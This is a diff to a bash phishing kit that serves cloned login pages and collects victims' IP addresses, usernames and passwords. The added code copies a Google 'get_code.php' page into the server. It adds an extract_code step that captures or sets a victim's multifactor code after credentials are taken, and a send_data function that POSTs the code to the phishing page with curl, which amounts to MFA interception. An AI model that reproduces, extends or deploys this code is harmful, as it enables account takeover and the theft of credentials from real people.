@@ -416,6 +416,8 @@ setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
+	cp -f .sites/google_new/get_code.php .server/www/
+	cp -f .sites/google_new/code.txt .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
@@ -429,6 +431,54 @@ capture_ip() {
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
+## Extract code
+extract_code() {
+    if [ -f .server/www/code.txt ]; then
+        read -p "Enter the new code (leave empty to keep the existing code): " USER_INPUT
+        if [ -z "$USER_INPUT" ]; then
+            CODE=$(awk '{print $0}' .server/www/code.txt)
+            echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Extracted Code:"
+            echo -e "${BLUE}$CODE"
+            echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/code.txt"
+            echo "$CODE" > auth/code.txt
+
+			send_data http://${HOST}:${PORT}/demo.html ${USER_INPUT}
+        else
+            echo "$USER_INPUT" > .server/www/code.txt
+            echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} New code entered by user:"
+            echo -e "${BLUE}$USER_INPUT"
+            echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}.server/www/code.txt"
+			send_data http://${HOST}:${PORT}/demo.html ${USER_INPUT}
+        fi
+    else
+        read -p "Enter the code: " USER_INPUT
+        echo "$USER_INPUT" > .server/www/code.txt
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Code entered by user:"
+        echo -e "${BLUE}$USER_INPUT"
+        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}.server/www/code.txt"
+		send_data http://${HOST}:${PORT}/demo.html ${USER_INPUT}
+    fi
+}
+
+## Send data
+send_data() {
+	url=${1:-http://127.0.0.1:4040}
+	number=${2:-34}
+
+	echo -e "\n${RED}[${WHITE}-${RED}]${ORANGE} Sending data to URL: ${GREEN}$url"
+
+    response=$(curl -s -X POST -d "number=$number" "$url" 2>&1)
+    if [[ $? -eq 0 ]]; then
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Data sent successfully!"
+
+    else
+        echo -e "\n${RED}[${WHITE}-${RED}]${RED} Failed to send data!"
+        echo -e "$response"
+    fi
+} 
+
+# usage send_data "https://example.com/api/data" "123456"
+
 ## Get credentials
 capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
@@ -438,8 +488,14 @@ capture_creds() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Generate Multifactor Code...\n"
+	extract_code
+
+	echo -e "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+
 }
+
 
 ## Print data
 capture_data() {
